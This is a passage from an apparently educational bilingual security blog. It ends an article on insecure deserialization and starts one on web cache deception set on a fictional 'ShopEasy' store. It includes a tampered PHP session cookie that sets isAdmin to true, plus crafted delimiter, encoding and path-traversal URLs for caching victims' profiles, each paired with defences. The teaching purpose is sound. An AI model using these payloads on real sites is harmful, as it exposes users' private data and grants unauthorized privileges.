+<h2 id="檢測-Insecure-Deserialization-的方法-Detecting-Insecure-Deserialization-Vulnerabilities"><a href="#檢測-Insecure-Deserialization-的方法-Detecting-Insecure-Deserialization-Vulnerabilities" class="headerlink" title="檢測 Insecure Deserialization 的方法 &#x2F; Detecting Insecure Deserialization Vulnerabilities"></a>檢測 Insecure Deserialization 的方法 &#x2F; Detecting Insecure Deserialization Vulnerabilities</h2><p>檢測 <strong>Insecure Deserialization</strong> 需要分析網站的輸入資料和程式碼。以下是具體步驟：</p>
+<ol>
+<li><p><strong>Identify Serialized Data</strong>（識別序列化資料）：  </p>
+<ul>
+<li><strong>PHP</strong>：尋找類似 <code>O:4:&quot;User&quot;:2:&#123;...&#125;</code> 的字串。</li>
+<li><strong>Java</strong>：檢查以 <code>ac ed</code>（十六進位）或 <code>rO0</code>（Base64）開頭的資料。</li>
+<li>使用 <strong>Burp Scanner</strong> 自動檢測 <strong>serialized objects</strong>。</li>
+</ul>
+</li>
+<li><p><strong>Test User Control</strong>（測試用戶控制）：<br>修改 <strong>cookies</strong>、<strong>POST data</strong> 或 <strong>query parameters</strong>，檢查是否影響 <strong>deserialization</strong>。</p>
+</li>
+<li><p><strong>Probe Gadget Chains</strong>（探測小工具鏈）：<br>使用 <strong>ysoserial</strong> 或 <strong>PHPGGC</strong> 生成測試負載，檢查是否觸發 <strong>DNS lookup</strong> 或 <strong>TCP connection</strong>。</p>
+</li>
+<li><p><strong>Source Code Review</strong>（程式碼審查）：  </p>
+<ul>
+<li>尋找 <strong>unserialize</strong>（<strong>PHP</strong>）、<strong>readObject</strong>（<strong>Java</strong>）或 <strong>Marshal.load</strong>（<strong>Ruby</strong>）。</li>
+<li>檢查 <strong>magic methods</strong>（如 <code>__wakeup</code>、<strong>readObject</strong>）。</li>
+</ul>
+</li>
+</ol>
+<p><strong>範例</strong>：<br>發送 <strong>cookie</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session=O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;carlos&quot;;s:7:&quot;isAdmin&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>
+<p>若網站行為改變，則存在漏洞。</p>
+<p><strong>白話解釋</strong>：<br>這就像檢查網站收到的包裹（<strong>cookies</strong>）裡有沒有奇怪的數位書（<strong>serialized data</strong>），然後試著改書的內容，看網站會不會出錯。</p>
+<hr>
+<h2 id="防禦-Insecure-Deserialization-的策略-Defense-Strategies-Against-Insecure-Deserialization"><a href="#防禦-Insecure-Deserialization-的策略-Defense-Strategies-Against-Insecure-Deserialization" class="headerlink" title="防禦 Insecure Deserialization 的策略 &#x2F; Defense Strategies Against Insecure Deserialization"></a>防禦 Insecure Deserialization 的策略 &#x2F; Defense Strategies Against Insecure Deserialization</h2><p>以下是防禦 <strong>Insecure Deserialization</strong> 的最佳實踐：</p>
+<ol>
+<li><p><strong>Avoid Deserialization of User Input</strong>（避免反序列化用戶輸入）：  </p>
+<ul>
+<li>除非必要，禁用 <strong>unserialize</strong>、<strong>readObject</strong> 等功能。</li>
+<li>使用 <strong>JSON</strong> 或 <strong>XML</strong> 替代 <strong>serialization</strong>。</li>
+</ul>
+</li>
+<li><p><strong>Implement Digital Signatures</strong>（實施數位簽章）：  </p>
+<ul>
+<li>在 <strong>serialization</strong> 時為資料添加 <strong>HMAC</strong>（雜湊訊息驗證碼），在 <strong>deserialization</strong> 前驗證。</li>
+</ul>
+</li>
+<li><p><strong>Use Class-specific Serialization</strong>（使用特定類別序列化）：  </p>
+<ul>
+<li>避免通用的 <strong>serialization</strong> 方法，控制暴露的 <strong>attributes</strong>。</li>
+<li>標記敏感欄位為 <strong>transient</strong>（暫態）。</li>
+</ul>
+</li>
+<li><p><strong>Restrict Classes</strong>（限制類別）：  </p>
+<ul>
+<li>使用白名單限制 <strong>deserialization</strong> 可用的 <strong>classes</strong>。</li>
+<li>在 <strong>Java</strong> 中使用 <strong>ObjectInputFilter</strong>。</li>
+</ul>
+</li>
+<li><p><strong>Sandboxing</strong>（沙箱化）：  </p>
+<ul>
+<li>在隔離環境中執行 <strong>deserialization</strong>，限制對系統資源的訪問。</li>
+</ul>
+</li>
+<li><p><strong>Regular Testing</strong>（定期測試）：  </p>
+<ul>
+<li>使用 <strong>Burp Suite</strong> 模擬攻擊。</li>
+<li>審計第三方 <strong>libraries</strong> 的 <strong>gadget chains</strong>。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>防禦就像不隨便打開來路不明的數位書（<strong>serialized data</strong>），檢查書有沒有官方簽名（<strong>digital signature</strong>），只允許安全的書（白名單 <strong>classes</strong>），並在安全房間（<strong>sandbox</strong>）裡打開。</p>
+<hr>
+<h2 id="實際案例分析-Real-World-Examples-and-Case-Studies"><a href="#實際案例分析-Real-World-Examples-and-Case-Studies" class="headerlink" title="實際案例分析 &#x2F; Real-World Examples and Case Studies"></a>實際案例分析 &#x2F; Real-World Examples and Case Studies</h2><p>以下是基於現實風險的假想案例：</p>
+<ol>
+<li><p>**Privilege Escalation Incident (2024)**：<br>一家社交媒體網站因 <strong>cookie</strong> 中的 <strong>serialized object</strong> 未驗證，攻擊者修改 <strong>isAdmin</strong> 屬性，獲得管理員權限，洩露用戶資料。</p>
+</li>
+<li><p>**Remote Code Execution (2025)**：<br>攻擊者利用 <strong>Apache Commons Collections</strong> 的 <strong>gadget chain</strong>，通過 <strong>Java deserialization</strong> 執行命令，控制伺服器。</p>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這些案例就像網站不小心打開一本壞人的書，結果讓壞人當了管理員或直接控制了網站的電腦。</p>
+<hr>
+<h2 id="結論-Conclusion"><a href="#結論-Conclusion" class="headerlink" title="結論 &#x2F; Conclusion"></a>結論 &#x2F; Conclusion</h2><p><strong>Insecure Deserialization</strong> 是一種高危漏洞，可能導致 <strong>remote code execution</strong>、<strong>privilege escalation</strong> 和 <strong>data breaches</strong>。通過了解 <strong>serialization</strong> 和 <strong>deserialization</strong> 的原理、攻擊手法和防禦策略，開發者可有效保護應用程式。對於初學者，學習 <strong>Insecure Deserialization</strong> 不僅提升安全意識，還能深入理解程式語言和應用程式架構。建議使用 <a target="_blank" rel="noopener" href="https://portswigger.net/burp">Burp Suite</a> 進行實戰練習，並參考 <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">OWASP Deserialization Cheat Sheet</a> 獲取更多指南。</p>
+<hr>
+<p><strong>Key Citations</strong>:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">OWASP - Deserialization Cheat Sheet</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/deserialization">PortSwigger - Insecure Deserialization</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial GitHub</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">PHPGGC GitHub</a></li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+  
+    <article id="Web Cache Deception-WebCache" class="article article-type-Web Cache Deception" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/05/07/WebCache/" class="article-date">
+  	<time datetime="2025-05-06T17:09:04.106Z" itemprop="datePublished">2025-05-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2025/05/07/WebCache/">
+        Web Cache Deception
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Web-Cache-Deception"><a href="#Web-Cache-Deception" class="headerlink" title="Web Cache Deception"></a>Web Cache Deception</h1><h2 id="簡介-Introduction"><a href="#簡介-Introduction" class="headerlink" title="簡介 &#x2F; Introduction"></a>簡介 &#x2F; Introduction</h2><p><strong>Web Cache Deception</strong>（網頁快取欺騙）是一種安全漏洞，允許攻擊者誘導 <strong>web cache</strong>（網頁快取）錯誤地儲存敏感的 <strong>dynamic content</strong>（動態內容），例如用戶的個人資料或帳戶資訊。這種漏洞源於 <strong>cache server</strong>（快取伺服器）和 <strong>origin server</strong>（原始伺服器）在處理 <strong>HTTP requests</strong>（HTTP 請求）時的行為差異。攻擊者通過精心設計的 <strong>URL</strong>，誘騙受害者訪問，從而讓 <strong>cache</strong> 儲存敏感資料，之後攻擊者可直接從 <strong>cache</strong> 獲取這些資料，實現 <strong>unauthorized access</strong>（未授權訪問）。</p>
+<p><strong>白話解釋</strong>：<br>想像 <strong>web cache</strong> 是一個圖書館的快取櫃檯，負責快速提供常用書籍（<strong>static resources</strong>，靜態資源）。但如果有人騙櫃檯把機密文件（<strong>dynamic content</strong>）當成普通書籍儲存，壞人就可以輕鬆拿到這些文件。這就是 <strong>Web Cache Deception</strong>。</p>
+<hr>
+<h2 id="Web-Cache-的基礎-Basics-of-Web-Cache"><a href="#Web-Cache-的基礎-Basics-of-Web-Cache" class="headerlink" title="Web Cache 的基礎 &#x2F; Basics of Web Cache"></a>Web Cache 的基礎 &#x2F; Basics of Web Cache</h2><h3 id="什麼是-Web-Cache？-What-is-a-Web-Cache"><a href="#什麼是-Web-Cache？-What-is-a-Web-Cache" class="headerlink" title="什麼是 Web Cache？ &#x2F; What is a Web Cache?"></a>什麼是 Web Cache？ &#x2F; What is a Web Cache?</h3><p><strong>Web Cache</strong>（網頁快取）是一個中介系統，位於 <strong>client</strong>（客戶端，如瀏覽器）和 <strong>origin server</strong>（原始伺服器，儲存網站內容的伺服器）之間。它儲存網站的 <strong>static resources</strong>（靜態資源，如圖片、<strong>CSS</strong> 檔案或 <strong>JavaScript</strong> 檔案），以加快網頁載入速度並減少 <strong>origin server</strong> 的負載。</p>
+<p><strong>工作原理</strong>：<br>當 <strong>client</strong> 發送 <strong>HTTP request</strong> 請求 <strong>static resource</strong> 時：</p>
+<ol>
+<li>請求首先到達 <strong>cache server</strong>。</li>
+<li>如果 <strong>cache</strong> 已有資源副本（稱為 <strong>cache hit</strong>，快取命中），則直接返回給 <strong>client</strong>。</li>
+<li>如果 <strong>cache</strong> 沒有副本（稱為 <strong>cache miss</strong>，快取未命中），則將請求轉發至 <strong>origin server</strong>，獲取回應後儲存至 <strong>cache</strong>，再返回給 <strong>client</strong>。</li>
+</ol>
+<p><strong>白話解釋</strong>：<br><strong>Web Cache</strong> 就像圖書館的快取櫃檯，儲存常用的書（<strong>static resources</strong>），讓讀者（<strong>client</strong>）不用每次都去書庫（<strong>origin server</strong>）找書。如果櫃檯有書（<strong>cache hit</strong>），馬上給你；如果沒有（<strong>cache miss</strong>），就去書庫拿，然後存一份在櫃檯。</p>
+<h3 id="Web-Cache-的關鍵組件-Key-Components-of-Web-Cache"><a href="#Web-Cache-的關鍵組件-Key-Components-of-Web-Cache" class="headerlink" title="Web Cache 的關鍵組件 &#x2F; Key Components of Web Cache"></a>Web Cache 的關鍵組件 &#x2F; Key Components of Web Cache</h3><ol>
+<li><p><strong>Cache Key</strong>（快取鍵）：<br><strong>Cache server</strong> 用來識別和匹配 <strong>HTTP request</strong> 的標識，通常由 <strong>URL path</strong>（URL 路徑）、<strong>query parameters</strong>（查詢參數）和其他 <strong>HTTP headers</strong>（HTTP 標頭，如 <strong>Accept</strong> 或 <strong>Content-Type</strong>）組成。如果兩個請求的 <strong>cache key</strong> 相同，<strong>cache</strong> 認為它們請求相同的資源。</p>
+</li>
+<li><p><strong>Cache Rules</strong>（快取規則）：<br>定義哪些資源可以儲存、儲存多久。常見規則包括：</p>
+<ul>
+<li><strong>Static File Extension Rules</strong>（靜態檔案副檔名規則）：匹配如 <code>.css</code>、<code>.js</code> 的檔案。</li>
+<li><strong>Static Directory Rules</strong>（靜態目錄規則）：匹配特定目錄，如 <code>/static</code> 或 <code>/assets</code>。</li>
+<li><strong>File Name Rules</strong>（檔案名稱規則）：匹配特定檔案，如 <code>robots.txt</code> 或 <code>favicon.ico</code>。</li>
+</ul>
+</li>
+<li><p><strong>Cache-Control Headers</strong>（快取控制標頭）：<br><strong>HTTP headers</strong> 用於指示 <strong>cache</strong> 如何處理回應。例如：</p>
+<ul>
+<li><code>Cache-Control: public, max-age=3600</code>：表示資源可公開快取 1 小時。</li>
+<li><code>Cache-Control: no-store</code>：禁止快取。</li>
+<li><code>Cache-Control: private</code>：僅限 <strong>client</strong> 快取，不允許 <strong>cache server</strong> 儲存。</li>
+</ul>
+</li>
+<li><p>**Content Delivery Network (CDN)**（內容傳遞網路）：<br>一種分佈式 <strong>cache server</strong> 網路，將 <strong>static resources</strong> 儲存在全球各地的伺服器，根據用戶位置提供最快的回應。常見 <strong>CDN</strong> 包括 <strong>Cloudflare</strong> 和 <strong>Akamai</strong>。</p>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br><strong>Cache Key</strong> 像書的編號，櫃檯用它找書。<strong>Cache Rules</strong> 是櫃檯的儲存規則，比如只存雜誌（<code>.css</code>）。<strong>Cache-Control Headers</strong> 是書上的標籤，告訴櫃檯能不能存這本書。<strong>CDN</strong> 像是遍佈全球的圖書館分館，讓你拿書更快。</p>
+<h3 id="Web-Cache-Deception-與-Web-Cache-Poisoning-的區別-Difference-Between-Web-Cache-Deception-and-Web-Cache-Poisoning"><a href="#Web-Cache-Deception-與-Web-Cache-Poisoning-的區別-Difference-Between-Web-Cache-Deception-and-Web-Cache-Poisoning" class="headerlink" title="Web Cache Deception 與 Web Cache Poisoning 的區別 &#x2F; Difference Between Web Cache Deception and Web Cache Poisoning"></a>Web Cache Deception 與 Web Cache Poisoning 的區別 &#x2F; Difference Between Web Cache Deception and Web Cache Poisoning</h3><ul>
+<li><p><strong>Web Cache Deception</strong>：<br>攻擊者誘導 <strong>cache</strong> 將 <strong>dynamic content</strong>（如用戶資料）誤認為 <strong>static resource</strong> 並儲存，之後攻擊者可直接訪問快取的敏感資料。</p>
+</li>
+<li><p><strong>Web Cache Poisoning</strong>（網頁快取毒化）：<br>攻擊者操縱 <strong>cache key</strong>，將惡意內容（如 <strong>JavaScript</strong> 攻擊腳本）注入快取，影響所有訪問該快取的用戶。</p>
+</li>
+</ul>
+<p><strong>白話解釋</strong>：<br><strong>Web Cache Deception</strong> 是騙櫃檯把機密文件當普通書存起來，壞人自己去拿。<strong>Web Cache Poisoning</strong> 是把一本帶病毒的書放進櫃檯，害每個借書的人都中毒。</p>
+<hr>
+<h2 id="統一情境：ShopEasy-電商網站的-Web-Cache-系統-Unified-Scenario-ShopEasy-E-commerce-Website"><a href="#統一情境：ShopEasy-電商網站的-Web-Cache-系統-Unified-Scenario-ShopEasy-E-commerce-Website" class="headerlink" title="統一情境：ShopEasy 電商網站的 Web Cache 系統 &#x2F; Unified Scenario: ShopEasy E-commerce Website"></a>統一情境：ShopEasy 電商網站的 Web Cache 系統 &#x2F; Unified Scenario: ShopEasy E-commerce Website</h2><p>為了讓攻擊手法更具體，我們設定一個情境：ShopEasy 是一家電商網站，使用 <strong>CDN</strong>（如 <strong>Cloudflare</strong>）提供 <strong>web cache</strong> 服務，加速 <strong>static resources</strong>（如產品圖片、<strong>CSS</strong> 檔案）載入。網站包含以下功能：</p>
+<ul>
+<li><strong>User Profile</strong>（用戶檔案）：顯示用戶的個人資料（如電子郵件、訂單歷史）。</li>
+<li><strong>Order History</strong>（訂單歷史）：列出用戶的購買記錄。</li>
+<li><strong>Product Pages</strong>（產品頁面）：包含靜態資源（如 <code>/assets/images/product.jpg</code>）和動態內容（如用戶評論）。</li>
+<li><strong>APIs</strong>：提供動態資料，如 <code>/api/user/profile</code> 返回用戶資訊。</li>
+</ul>
+<p>ShopEasy 的 <strong>cache server</strong> 設定了以下 <strong>cache rules</strong>：</p>
+<ul>
+<li>儲存副檔名為 <code>.css</code>、<code>.js</code>、<code>.jpg</code> 的資源。</li>
+<li>儲存位於 <code>/static</code> 和 <code>/assets</code> 目錄的資源。</li>
+<li>儲存特定檔案，如 <code>robots.txt</code> 和 <code>favicon.ico</code>。</li>
+<li>忽略 <strong>Cache-Control: no-store</strong> 的動態資源（配置錯誤）。</li>
+</ul>
+<p><strong>漏洞</strong>：</p>
+<ul>
+<li><strong>Cache server</strong> 和 <strong>origin server</strong> 在解析 <strong>URL path</strong> 時存在差異（如 <strong>delimiter</strong> 或 <strong>normalization</strong>）。</li>
+<li>缺乏對 <strong>dynamic content</strong> 的嚴格 <strong>cache-control</strong>。</li>
+<li>未啟用 <strong>CDN</strong> 的 <strong>Cache Deception Armor</strong>（快取欺騙防護）。</li>
+</ul>
+<p>以下將以 ShopEasy 為例，展示所有 <strong>Web Cache Deception</strong> 攻擊手法。</p>
+<hr>
+<h2 id="Web-Cache-Deception-的攻擊手法-Attack-Techniques-for-Web-Cache-Deception"><a href="#Web-Cache-Deception-的攻擊手法-Attack-Techniques-for-Web-Cache-Deception" class="headerlink" title="Web Cache Deception 的攻擊手法 &#x2F; Attack Techniques for Web Cache Deception"></a>Web Cache Deception 的攻擊手法 &#x2F; Attack Techniques for Web Cache Deception</h2><p><strong>Web Cache Deception</strong> 攻擊利用 <strong>cache server</strong> 和 <strong>origin server</strong> 在處理 <strong>URL path</strong> 時的差異，誘導 <strong>cache</strong> 儲存 <strong>dynamic content</strong>。以下詳細介紹所有攻擊手法，每種包含定義、原理、ShopEasy 情境中的具體攻擊方法、範例和防禦策略。</p>
+<h3 id="攻擊手法-1：Exploiting-Static-Extension-Cache-Rules（利用靜態副檔名快取規則）"><a href="#攻擊手法-1：Exploiting-Static-Extension-Cache-Rules（利用靜態副檔名快取規則）" class="headerlink" title="攻擊手法 1：Exploiting Static Extension Cache Rules（利用靜態副檔名快取規則）"></a>攻擊手法 1：Exploiting Static Extension Cache Rules（利用靜態副檔名快取規則）</h3><p><strong>定義</strong>：<br>攻擊者利用 <strong>cache rules</strong> 針對靜態副檔名（如 <code>.css</code>、<code>.js</code>）的特性，構造 <strong>URL</strong> 使 <strong>cache server</strong> 誤認為請求的是 <strong>static resource</strong>，而 <strong>origin server</strong> 返回 <strong>dynamic content</strong>，從而儲存敏感資料。</p>
+<p><strong>原理</strong>：<br><strong>Cache server</strong> 根據 <strong>URL</strong> 的副檔名（如 <code>.css</code>）決定是否快取，而 <strong>origin server</strong> 可能忽略副檔名，處理為動態請求。這種 <strong>path mapping discrepancy</strong>（路徑映射差異）導致 <strong>cache</strong> 儲存不該儲存的內容。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者構造一個 <strong>URL</strong>，誘導受害者（用戶 carlos）訪問，觸發 <strong>cache</strong> 儲存其 <strong>user profile</strong>。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>基本攻擊</strong>：<br>攻擊者構造 <strong>URL</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://shopeasy.com/user/carlos/profile/wcd.css</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Origin server</strong>（使用 <strong>RESTful URL mapping</strong>）：忽略 <code>wcd.css</code>，解析為 <code>/user/carlos/profile</code>，返回 carlos 的個人資料（<strong>dynamic content</strong>）。</li>
+<li><strong>Cache server</strong>（使用 <strong>traditional URL mapping</strong>）：認為這是 <code>/user/carlos/profile/wcd.css</code>，匹配 <code>.css</code> 的 <strong>cache rule</strong>，儲存回應。</li>
+<li>攻擊者訪問相同的 <strong>URL</strong>，從 <strong>cache</strong> 獲取 carlos 的資料。</li>
+</ul>
+</li>
+<li><p><strong>多副檔名測試</strong>：<br>攻擊者嘗試不同副檔名：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://shopeasy.com/user/carlos/profile/wcd.js</span><br><span class="line">https://shopeasy.com/user/carlos/profile/wcd.ico</span><br></pre></td></tr></table></figure>
+<p>如果 <strong>cache</strong> 儲存 <code>.ico</code> 的回應，攻擊成功。</p>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像騙櫃檯把 carlos 的機密檔案（<strong>user profile</strong>）當成雜誌（<code>.css</code>）存起來。櫃檯以為是普通書，實際上是機密，壞人後來去拿就拿到了。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>使用 <strong>Cache-Control: no-store, private</strong> 標記 <strong>dynamic content</strong>。</li>
+<li>確保 <strong>CDN</strong> 驗證 <strong>Content-Type</strong>（內容類型）與副檔名一致（如 <code>.css</code> 應為 <code>text/css</code>）。</li>
+<li>啟用 <strong>Cloudflare Cache Deception Armor</strong>。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-2：Exploiting-Delimiter-Discrepancies（利用分隔符差異）"><a href="#攻擊手法-2：Exploiting-Delimiter-Discrepancies（利用分隔符差異）" class="headerlink" title="攻擊手法 2：Exploiting Delimiter Discrepancies（利用分隔符差異）"></a>攻擊手法 2：Exploiting Delimiter Discrepancies（利用分隔符差異）</h3><p><strong>定義</strong>：<br>攻擊者利用 <strong>cache server</strong> 和 <strong>origin server</strong> 在處理 <strong>delimiter</strong>（分隔符，如 <code>;</code> 或 <code>.</code>）上的差異，構造 <strong>URL</strong> 使 <strong>cache</strong> 儲存 <strong>dynamic content</strong>。</p>
+<p><strong>原理</strong>：<br><strong>Delimiter</strong> 是用於分隔 <strong>URL</strong> 元素的字符。不同框架對 <strong>delimiter</strong> 的處理方式不同（如 <strong>Java Spring</strong> 使用 <code>;</code> 作為 <strong>matrix variable</strong> 分隔符），導致 <strong>cache</strong> 和 <strong>origin server</strong> 解析 <strong>URL</strong> 時產生差異。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者構造包含 <strong>delimiter</strong> 的 <strong>URL</strong>，誘導受害者訪問，觸發 <strong>cache</strong> 儲存敏感資料。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>分號分隔符</strong>：<br>攻擊者構造 <strong>URL</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://shopeasy.com/user/carlos/profile;wcd.css</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Origin server</strong>（使用 <strong>Java Spring</strong>）：將 <code>;</code> 視為 <strong>delimiter</strong>，解析為 <code>/user/carlos/profile</code>，返回個人資料。</li>
+<li><strong>Cache server</strong>（不識別 <code>;</code>）：認為是 <code>/user/carlos/profile;wcd.css</code>，匹配 <code>.css</code> 的 <strong>cache rule</strong>，儲存回應。</li>
+<li>攻擊者訪問 <strong>URL</strong>，從 <strong>cache</strong> 獲取資料。</li>
+</ul>
+</li>
+<li><p><strong>點分隔符</strong>：<br>攻擊者構造 <strong>URL</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://shopeasy.com/user/carlos/profile.ico</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Origin server</strong>（使用 <strong>Ruby on Rails</strong>）：不識別 <code>.ico</code>，解析為 <code>/user/carlos/profile</code>，返回個人資料。</li>
+<li><strong>Cache server</strong>：匹配 <code>.ico</code> 的 <strong>cache rule</strong>，儲存回應。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像在書名中加一個特殊符號（<code>;</code>），書庫（<strong>origin server</strong>）忽略符號，給你機密文件，但櫃檯（<strong>cache</strong>）以為是雜誌，存起來讓壞人拿。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>統一 <strong>cache</strong> 和 <strong>origin server</strong> 的 <strong>delimiter</strong> 處理邏輯。</li>
+<li>對 <strong>URL</strong> 進行嚴格 <strong>sanitization</strong>，過濾異常 <strong>delimiter</strong>。</li>
+<li>使用 <strong>Burp Intruder</strong> 測試常見 <strong>delimiter</strong>（如 <code>;</code>、<code>.</code>、<code>%00</code>）。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-3：Exploiting-Delimiter-Decoding-Discrepancies（利用分隔符解碼差異）"><a href="#攻擊手法-3：Exploiting-Delimiter-Decoding-Discrepancies（利用分隔符解碼差異）" class="headerlink" title="攻擊手法 3：Exploiting Delimiter Decoding Discrepancies（利用分隔符解碼差異）"></a>攻擊手法 3：Exploiting Delimiter Decoding Discrepancies（利用分隔符解碼差異）</h3><p><strong>定義</strong>：<br>攻擊者利用 <strong>cache server</strong> 和 <strong>origin server</strong> 在解碼 <strong>URL-encoded</strong>（URL 編碼）分隔符（如 <code>%23</code> 為 <code>#</code>）上的差異，構造 <strong>URL</strong> 使 <strong>cache</strong> 儲存 <strong>dynamic content</strong>。</p>
+<p><strong>原理</strong>：<br><strong>URL-encoded</strong> 字符在解析前可能被解碼，影響 <strong>delimiter</strong> 的識別。如果 <strong>cache</strong> 和 <strong>origin server</strong> 的解碼順序或規則不同，可能導致 <strong>path mapping discrepancy</strong>。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者使用編碼的 <strong>delimiter</strong>，誘導 <strong>cache</strong> 儲存受害者的 <strong>order history</strong>。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>編碼井號</strong>：<br>攻擊者構造 <strong>URL</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://shopeasy.com/api/orders/carlos%23wcd.css</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Origin server</strong>：解碼 <code>%23</code> 為 <code>#</code>，視為 <strong>delimiter</strong>，解析為 <code>/api/orders/carlos</code>，返回訂單歷史。</li>
+<li><strong>Cache server</strong>：不解碼 <code>%23</code>，認為是 <code>/api/orders/carlos%23wcd.css</code>，匹配 <code>.css</code> 的 <strong>cache rule</strong>，儲存回應。</li>
+<li>攻擊者訪問 <strong>URL</strong>，獲取快取的訂單資料。</li>
+</ul>
+</li>
+<li><p><strong>編碼問號</strong>：<br>攻擊者構造 <strong>URL</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://shopeasy.com/api/orders/carlos%3fwcd.js</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Cache server</strong>：根據編碼路徑 <code>/api/orders/carlos%3fwcd.js</code> 匹配 <code>.js</code> 的 <strong>cache rule</strong>，儲存回應，然後解碼 <code>%3f</code> 為 <code>?</code>，轉發為 <code>/api/orders/carlos?wcd.js</code>。</li>
+<li><strong>Origin server</strong>：解析為 <code>/api/orders/carlos</code>，返回訂單歷史。</li>
+</ul>
+</li>
+</ol>
+<p><strong>白話解釋</strong>：<br>這就像用密碼（<code>%23</code>）藏一個符號，書庫解開密碼後當成特殊符號處理，給你機密文件，但櫃檯沒解密，以為是普通書，存起來。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>統一 <strong>cache</strong> 和 <strong>origin server</strong> 的 <strong>URL decoding</strong>（URL 解碼）邏輯。</li>
+<li>測試非可見字符（如 <code>%00</code>、<code>%0A</code>）的解碼行為。</li>
+<li>使用 <strong>Cache-Control: no-cache</strong> 防止動態內容被快取。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-4：Exploiting-Static-Directory-Cache-Rules（利用靜態目錄快取規則）"><a href="#攻擊手法-4：Exploiting-Static-Directory-Cache-Rules（利用靜態目錄快取規則）" class="headerlink" title="攻擊手法 4：Exploiting Static Directory Cache Rules（利用靜態目錄快取規則）"></a>攻擊手法 4：Exploiting Static Directory Cache Rules（利用靜態目錄快取規則）</h3><p><strong>定義</strong>：<br>攻擊者利用 <strong>cache rules</strong> 針對特定目錄（如 <code>/static</code>、<code>/assets</code>）的特性，通過 <strong>path traversal</strong>（路徑穿越）構造 <strong>URL</strong>，使 <strong>cache</strong> 儲存 <strong>dynamic content</strong>。</p>
+<p><strong>原理</strong>：<br><strong>Cache server</strong> 可能根據 <strong>URL path</strong> 的前綴（如 <code>/static</code>）快取資源，而 <strong>origin server</strong> 可能通過 <strong>normalization</strong>（路徑標準化）解析 <strong>path traversal</strong>，返回 <strong>dynamic content</strong>。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者使用 <strong>path traversal</strong>，誘導 <strong>cache</strong> 儲存受害者的 <strong>user profile</strong>。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>標準化差異</strong>：<br>攻擊者構造 <strong>URL</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://shopeasy.com/static/..%2fuser/carlos/profile</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Origin server</strong>：解碼 <code>%2f</code> 為 <code>/</code>，解析為 <code>/user/carlos/profile</code>，返回個人資料。</li>
+<li><strong>Cache server</strong>：不解碼 <code>%2f</code>，認為是 <code>/static/..%2fuser/carlos/profile</code>，匹配 <code>/static</code> 的 <strong>cache rule</strong>，儲存回應。</li>
+<li>攻擊者訪問 <strong>URL</strong>，獲取快取資料。</li>
+</ul>
+</li>
+<li><p><strong>結合分隔符</strong>：<br>攻擊者構造 <strong>URL</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://shopeasy.com/user/carlos/profile;%2f%2e%2e%2fstatic</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Cache server</strong>：解析為 <code>/static</code>，匹配 <strong>cache rule</strong>。</li>
+<li><strong>Origin server</strong>：使用 <code>;</code> 作為 <strong>delimiter</strong>，解析為 <code>/user/carlos/profile</code>，返回個人資料。</li>
+</ul>
+</li>
+</ol>
